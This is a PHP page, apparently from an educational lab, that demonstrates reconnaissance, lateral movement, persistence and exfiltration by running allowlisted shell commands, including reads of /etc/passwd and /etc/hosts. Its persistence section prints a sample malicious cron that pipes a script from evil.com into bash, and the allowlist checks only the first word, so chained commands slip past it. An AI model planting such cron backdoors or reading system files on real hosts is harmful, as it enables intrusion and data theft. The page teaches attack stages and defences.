<?php
// advanced_attacks.php
require_once __DIR__ . '/../src/bootstrap.php';

// Check admin session
$sid = $_COOKIE['SID'] ?? '';
$user_json = $redis->get("session_$sid");
$user = $user_json ? json_decode($user_json,true) : null;

if(!$user || ($user['role'] ?? '') !== 'admin'){
    http_response_code(403);
    echo "Forbidden";
    exit;
}

// Function to safely execute commands
function safe_exec($cmd) {
    $allowed = ['whoami', 'id', 'pwd', 'ls', 'netstat', 'cat', 'find', 'ps', 'uname', 'df', 'hostname'];
    $base_cmd = explode(' ', $cmd)[0];
    if (in_array($base_cmd, $allowed)) {
        $output = shell_exec($cmd . ' 2>&1');
        return $output ?: "No output";
    }
    return "Command not allowed for safety";
}

$attack = $_GET['attack'] ?? 'recon';

echo "<!DOCTYPE html>
<html>
<head>
    <title>Advanced Attack Techniques</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: #1a1a2e; color: #fff; }
        .attack-card { background: #162447; border: 2px solid #1f4068; border-radius: 10px; padding: 20px; margin: 20px 0; }
        .attack-card h3 { color: #e43f5a; margin-top: 0; }
        pre { background: #0f3460; color: #00ff9d; padding: 15px; border-radius: 5px; overflow-x: auto; }
        .nav { display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
        .nav a { background: #1f4068; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
        .nav a:hover { background: #e43f5a; }
        .danger { border-color: #e43f5a !important; }
        .warning { background: #ff9a00; color: #000; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .success { color: #00ff9d; }
    </style>
</head>
<body>

<h1>🔬 Advanced Attack Techniques Demo</h1>
<div class='warning'>⚠️ EDUCATIONAL PURPOSES ONLY - Isolated Environment</div>

<div class='nav'>
    <a href='?attack=recon'>Reconnaissance</a>
    <a href='?attack=lateral'>Lateral Movement</a>
    <a href='?attack=persistence'>Persistence</a>
    <a href='?attack=exfil'>Exfiltration</a>
    <a href='admin.php'>Back to Admin</a>
    <a href='presentation.php' target='_blank'>Presentation</a>
</div>
";

switch($attack) {
    case 'lateral':
        echo "<div class='attack-card danger' id='lateral'>
            <h3>🔄 Lateral Movement</h3>
            <h4>Network Discovery:</h4>
            <pre>" . htmlspecialchars(safe_exec('netstat -tulpn')) . "</pre>
            
            <h4>Host Information:</h4>
            <pre>" . htmlspecialchars(safe_exec('cat /etc/hosts')) . "</pre>
            
            <h4>System Information:</h4>
            <pre>" . htmlspecialchars(safe_exec('uname -a')) . "</pre>
        </div>";
        break;
        
    case 'persistence':
        echo "<div class='attack-card danger' id='persistence'>
            <h3>📅 Persistence Mechanisms</h3>
            
            <h4>Cron Jobs:</h4>
            <pre>Current crontab:\n" . htmlspecialchars(safe_exec('crontab -l 2>/dev/null || echo \"No user crontab\"')) . "</pre>
            
            <h4>Running Processes:</h4>
            <pre>" . htmlspecialchars(safe_exec('ps aux | head -20')) . "</pre>
            
            <h4>Example Malicious Cron:</h4>
            <pre>*/5 * * * * curl -s http://evil.com/c2 | bash
@reboot /tmp/.backdoor.sh</pre>
        </div>";
        break;
        
    case 'exfil':
        echo "<div class='attack-card' id='exfil'>
            <h3>📤 Data Exfiltration</h3>
            
            <h4>Current Directory:</h4>
            <pre>" . htmlspecialchars(safe_exec('pwd && ls -la')) . "</pre>
            
            <h4>System Users:</h4>
            <pre>" . htmlspecialchars(safe_exec('cat /etc/passwd | grep -E \"/bin/(bash|sh)\"')) . "</pre>
            
            <h4>Disk Usage:</h4>
            <pre>" . htmlspecialchars(safe_exec('df -h')) . "</pre>
        </div>";
        break;
        
    default: // recon
        echo "<div class='attack-card' id='recon'>
            <h3>🕵️ Initial Reconnaissance</h3>
            
            <h4>System Information:</h4>
            <pre>" . htmlspecialchars(safe_exec('uname -a')) . "</pre>
            
            <h4>Current User & Privileges:</h4>
            <pre class='success'>" . htmlspecialchars(safe_exec('whoami && id')) . "</pre>
            
            <h4>Process List:</h4>
            <pre>" . htmlspecialchars(safe_exec('ps aux | head -30')) . "</pre>
            
            <h4>Installed Packages:</h4>
            <pre>" . htmlspecialchars(safe_exec('dpkg -l 2>/dev/null | head -20 || rpm -qa 2>/dev/null | head -20 || echo \"Package manager not found\"')) . "</pre>
        </div>";
}

echo "
<div class='attack-card'>
    <h3>🎯 Attack Chain Summary</h3>
    <ol>
        <li><strong>Reconnaissance</strong>: Gather system info, users, network</li>
        <li><strong>Lateral Movement</strong>: Find other services, containers</li>
        <li><strong>Persistence</strong>: Install backdoors, cron jobs</li>
        <li><strong>Exfiltration</strong>: Steal data, credentials</li>
        <li><strong>Cleanup</strong>: Remove logs, cover tracks</li>
    </ol>
    
    <h4>Defensive Measures:</h4>
    <ul>
        <li>Least privilege principle</li>
        <li>Network segmentation</li>
        <li>File integrity monitoring</li>
        <li>Log analysis & SIEM</li>
        <li>Regular patching</li>
    </ul>
</div>

</body>
</html>";